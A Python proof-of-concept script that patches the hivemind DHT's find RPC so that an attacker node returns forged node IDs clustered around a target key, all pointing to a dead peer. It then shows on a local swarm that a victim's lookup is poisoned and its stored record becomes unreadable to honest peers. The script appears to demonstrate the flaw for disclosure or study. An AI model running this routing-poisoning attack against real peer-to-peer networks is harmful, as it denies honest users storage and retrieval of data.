import asyncio

from hivemind.dht.node import DHTNode
from hivemind.dht.protocol import DHTProtocol
from hivemind.dht.routing import DHTID
from hivemind.p2p import P2PContext
from hivemind.proto import dht_pb2
from hivemind.utils.timed_storage import get_dht_time

LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]
KEY = "some_valuable_key"
TARGET = DHTID.generate(source=KEY)

# filled in once the attacker exists; the forged pairs it will serve
attacker_node_id = None
forged_pairs = []

_original_rpc_find = DHTProtocol.rpc_find


async def rpc_find(self, request: dht_pb2.FindRequest, context: P2PContext) -> dht_pb2.FindResponse:
    response = await _original_rpc_find(self, request, context)
    if self.node_id != attacker_node_id:
        return response
    # the attacker answers with pairs of its own invention, replacing the honest ones
    for result in response.results:
        del result.nearest_node_ids[:]
        del result.nearest_peer_ids[:]
        for node_id, peer_id in forged_pairs:
            result.nearest_node_ids.append(node_id.to_bytes())
            result.nearest_peer_ids.append(peer_id.to_bytes())
    return response


DHTProtocol.rpc_find = rpc_find


async def main() -> None:
    global attacker_node_id

    # a throwaway node, killed immediately: gives us well-formed PeerIDs that nobody answers for
    ghost = await DHTNode.create(host_maddrs=LOCALHOST)
    ghost_peer_id = ghost.peer_id
    await ghost.shutdown()

    bootstrap = await DHTNode.create(host_maddrs=LOCALHOST)
    initial_peers = [str(addr) for addr in await bootstrap.get_visible_maddrs()]
    honest = [await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST) for _ in range(4)]
    attacker = await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST)
    attacker_node_id = attacker.node_id

    # node_ids sitting right on top of the target, each paired with a PeerID that is nobody
    forged_pairs.extend((DHTID(int(TARGET) ^ offset), ghost_peer_id) for offset in range(4))

    await asyncio.sleep(3)

    real_ids = {node.node_id for node in [bootstrap, *honest, attacker]}
    victim = honest[0]

    print(f"target key {KEY!r} -> {int(TARGET):#042x}")
    print(f"swarm: {len(real_ids)} real peers, 1 of them the attacker")
    print(f"attacker serves {len(forged_pairs)} forged pairs, all pointing at a dead PeerID\n")

    found = await victim.find_nearest_nodes([TARGET], k_nearest=5)
    returned = list(found[TARGET].keys())
    forged = [n for n in returned if n not in real_ids]

    print("what the victim's lookup returned:")
    for node_id in returned:
        tag = "FORGED (nobody is there)" if node_id not in real_ids else "real peer"
        print(f"  {int(node_id):#042x}  d={int(TARGET.xor_distance(node_id)):#x}  {tag}")
    print(f"\nforged entries in the answer : {len(forged)}/{len(returned)}")

    stored = await victim.store(KEY, b"honest value", expiration_time=get_dht_time() + 600)
    found_value = await honest[1].get(KEY, latest=True)
    print(f"\nvictim stored the record     : {stored}")
    print(f"another honest peer reads it : {found_value.value if found_value else 'NOT FOUND'}")

    holders = [n for n in [bootstrap, *honest, attacker] if n.protocol.storage.get(TARGET) is not None]
    print(f"peers actually holding it    : {len(holders)} (num_replicas default is 5)")

    for node in [bootstrap, *honest, attacker]:
        await node.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
